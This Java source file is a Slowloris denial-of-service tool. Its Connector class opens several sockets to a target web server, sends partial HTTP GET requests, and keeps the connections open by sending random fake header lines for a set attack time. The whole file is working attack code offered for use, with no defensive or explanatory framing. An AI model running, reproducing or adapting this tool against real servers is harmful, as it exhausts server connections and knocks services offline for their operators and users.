import java.io.IOException;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.Socket;
import java.net.URL;
import java.util.Random;

public class Connector implements Runnable
{
    /** the number of socket connections to the server per `Connector` instance */
    private static final int NUMBER_OF_CONNECTIONS = 5;
    /** the server port to connect to */
    private int port;
    /** number of seconds to stop the attack after, 0 = never stop */
    private int attackTime;

    /** the URL of the target */
    private URL targetURL;
    /** all of the connections Sockets for this Connector */
    private Socket[] allSockets = new Socket[NUMBER_OF_CONNECTIONS];
    /** the partial requests sent for each connection */
    private String[] allPartialRequests = new String[NUMBER_OF_CONNECTIONS];

    public Connector(String target, int port, int attackTime) throws MalformedURLException {
        this.port = port;
        this.attackTime = attackTime;
        String targetPrefix = target.startsWith("http://") ? "" : "http://";
        targetURL = new URL(targetPrefix + target);
        allPartialRequests = createInitialPartialRequests();

        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
            init(i);
    }

    /**
     * creates the initial partial requests that are sent to the server
     * @return a string array containing all the partial HTTP GET requests for every connection this Connector manages
     */
    private String[] createInitialPartialRequests()
    {
        String pagePrefix = "/";
        if(targetURL.getPath().startsWith("/"))
            pagePrefix = "";

        String type = "GET " + pagePrefix + targetURL.getPath() + " HTTP/1.1\r\n";
        String host = "Host: " + targetURL.getHost() + (port == 80 ? "" : ":" + port) + "\r\n";
        String contentType = "Content-Type: */* \r\n";
        String connection = "Connection: keep-alive\r\n";

        String[] allPartials = new String[NUMBER_OF_CONNECTIONS];
        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++)
            allPartials[i] = type + host + contentType + connection + "\r\n";

        return allPartials;
    }

    /**
     * used to start a connection with the server for a specified index. Sets up the socket
     * @param index which connction index to set up
     */
    private void init(int index)
    {
        try
        {
            System.out.println("Connector: " + toString() + "     Connecting: " + index);
            allSockets[index] = new Socket(InetAddress.getByName(targetURL.toExternalForm().replace("http://", "")), port);
    }
        catch(IOException ioe)
        {
            ioe.printStackTrace();
            System.exit(-1);
        }
    }

    @Override
    public void run() {
        long startTime = System.currentTimeMillis();

        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++) { // each connection sends a partial request
            System.out.println("Connector: " + toString() + "    Sending partial request: " + i);
            sendPartialRequest(i);
            try {
                Thread.sleep(new Random().nextInt(2138));
            }
            catch(InterruptedException ie) {
                ie.printStackTrace();
            }
        }

        /* main attack loop */
        while((System.currentTimeMillis() - startTime) < (attackTime * 60 * 1000))
            slowLorris();

        closeSockets();

    }

    /**
     * Terminate all the connections by sending "\r\n" ending sequence
     */
    private void closeSockets() {
        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++) {
            try {
                allSockets[i].getOutputStream().write("\r\n".getBytes());
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Send random info to the server for each connection.
     * Keep the connection alive.
     */
    private void slowLorris() {
        for(int i = 0; i < NUMBER_OF_CONNECTIONS; i++) {
            try {
                sendFalseHeaderField(i);
            } catch (IOException e) {
                e.printStackTrace();
            }
            try {
                Thread.sleep(new Random().nextInt(3407)); // Wait a random time before sending
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    /**
     * Send a fake header to the server so the server keeps the connection open
     * @param index - of the connection to send the fake info to
     */
    private void sendFalseHeaderField(int index) throws IOException {
        char[] alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ".toCharArray();
        String fakeField = alphabet[new Random().nextInt(alphabet.length)]
                + "-" + alphabet[new Random().nextInt(alphabet.length)]
                + ": " + new Random().nextInt() + "\r\n";

        allSockets[index].getOutputStream().write(fakeField.getBytes());
        System.out.println("Fake field: " + fakeField);

    }

    /**
     * Sends a partial HTTP GET request to the server
     * @param index oft the Socket to send the request to
     */
    private void sendPartialRequest(int index) {
        System.out.println(allPartialRequests[new Random().nextInt(NUMBER_OF_CONNECTIONS)]);
        try {
            allSockets[index].getOutputStream().write(allPartialRequests[new Random().nextInt(NUMBER_OF_CONNECTIONS)].getBytes()); // write a random partial HTTP GET request to the server
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
